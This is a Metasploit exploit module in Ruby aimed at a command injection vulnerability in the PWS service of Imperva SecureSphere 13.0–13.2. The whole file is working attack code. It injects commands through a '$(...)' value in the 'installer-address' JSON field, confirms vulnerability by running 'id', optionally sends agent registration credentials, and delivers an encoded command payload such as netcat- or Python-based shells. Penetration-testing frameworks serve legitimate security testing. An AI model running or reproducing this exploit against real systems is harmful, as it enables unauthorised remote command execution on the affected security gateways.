##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Imperva SecureSphere PWS Command Injection',
        'Description'    => %q(
          This module exploits a command injection vulnerability in Imperva
          SecureSphere 13.x. The vulnerability exists in the PWS service,
          where Python CGIs didn't properly sanitize user supplied command
          parameters and directly passes them to corresponding CLI utility,
          leading to command injection. Agent registration credential is
          required to exploit SecureSphere in gateway mode.

          This module was successfully tested on Imperva SecureSphere 13.0/13.1/
          13.2 in pre-ftl mode and unsealed gateway mode.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'rsp3ar <lukunming<at>gmail.com>' # Discovery/Metasploit Module
          ],
        'References'     =>
          [
            [ 'EDB', '45542' ]
          ],
        'Arch'           => ARCH_CMD,
        'Payload'        =>
          {
            'Compat'       =>
              {
                'PayloadType' => 'cmd',
                'RequiredCmd' => 'generic python perl ruby openssl netcat'
              }
          },
        'Platform'       => %w{ linux unix },
        'Targets'        =>
          [
            ['Imperva SecureSphere 13.0/13.1/13.2', {}]
          ],
        'DisclosureDate' => "Oct 8 2018",
        'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 443]),
        OptBool.new('SSL', [false, 'Use SSL', true]),
        OptString.new('USER', [false, 'Agent registration username', 'imperva']),
        OptString.new('PASS', [false, 'Agent registration password', '']),
        OptString.new('TARGETURI', [false, 'The URI path to impcli', '/pws/impcli']),
        OptInt.new('TIMEOUT', [false, 'HTTP connection timeout', 3])
      ])
  end

  def send_request(data)
    req_params = {
      'method'      => 'POST',
      'uri'         => normalize_uri(target_uri.path),
      'data'        => data.to_json
    }

    unless datastore['USER'].to_s.empty? or datastore['PASS'].to_s.empty?
      unless defined? @cookie
        res = send_request_cgi({
          'method'      => 'GET',
          'uri'         => normalize_uri('/')
        })
        @cookie = res.get_cookies
      end

      req_params['cookie'] = @cookie
      req_params['headers'] = {
        'Authorization' => 'Basic ' + Rex::Text.encode_base64(datastore['USER'] + ':' + datastore['PASS'])
      }
    end

    send_request_cgi(req_params, datastore['TIMEOUT'])
  end

  def execute_command_via_http(cmd)
    data = {
      'command'     => 'impctl server status',
      'parameters'  => {
        'broadcast'         => true,
        'installer-address' => "127.0.0.1 $(#{cmd})"
      }
    }

    begin
      res = send_request data
    rescue Rex::ConnectionError, Errno::ENOTCONN => e
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
    if res && res.code == 401
      fail_with(Failure::NoAccess, 'Authorization Failure, valid agent registration credential is required')
    end
    res
  end

  def check
    begin
      res = execute_command_via_http('id')
    rescue => e
      print_error("#{e}")
      return CheckCode::Unknown
    end

    if res.body =~ /uid=\d+\(.+\)/
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  def exploit
    unless CheckCode::Vulnerable == check
      unless datastore['ForceExploit']
        fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.')
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    print_status("Sending payload #{datastore['PAYLOAD']}")
    res = execute_command_via_http(payload.encoded)
  end
end
